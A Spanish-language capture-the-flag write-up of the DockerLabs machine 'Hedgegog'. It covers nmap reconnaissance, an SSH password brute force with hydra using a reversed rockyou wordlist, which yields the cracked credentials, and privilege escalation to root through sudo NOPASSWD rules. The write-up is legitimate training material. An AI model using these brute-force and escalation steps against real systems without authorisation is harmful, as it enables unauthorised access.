#MAQUINA #DOCKERLABS #MUY_FACIL 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Hedgegog** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 13:21 CET
Initiating ARP Ping Scan at 13:21
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:21, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:21
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:21, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-23 13:21:10 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 13:21 CET
Nmap scan report for 172.17.0.2
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 13:22 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que hay un mensaje:

   ```bash
Tails
```
Vemos que hay posible usuario ->**tails**

# EXPLOTACION

Tras un buen rato y ver el writeup de la creadora, veo que usa un rockyou invertido de la siguiente manera:

   ```bash
tac /usr/share/wordlists/rockyou.txt > rockinvert.txt
sed -i 's/ //g' rockinvert.tx

```

Usamos **hydra** para intentar sacar su contraseña:

   ```bash
hydra -l tails -P ./rockinvert.txt ssh://172.17.0.2 -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 14:00:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344386 login tries (l:1/p:14344386), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-23 14:00:14

```
**usuario : tails**
**contraseña: 3117548331**
# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
tails@e745be33a159:~$ sudo -l
User tails may run the following commands on e745be33a159:
    (sonic) NOPASSWD: ALL


```

Vemos **bash** con permisos SUDO con usuario sonic :
   ```bash
tails@e745be33a159:~$ sudo -u sonic bash
sonic@e745be33a159:/home/tails$ 
```

YA ESTAMOS COMO SONIC.

Vemos si el usuario tiene permisos SUDO:
   ```bash
sonic@e745be33a159:/home/tails$ sudo -l
User sonic may run the following commands on e745be33a159:
    (ALL) NOPASSWD: ALL

```

Vemos cualquier comando con permisos SUDO :
   ```bash
sonic@e745be33a159:/home/tails$ sudo bash -p
root@e745be33a159:/home/tails# whoami
root
root@e745be33a159:/home/tails# 
```

**YA ESTAMOS COMO ROOT.**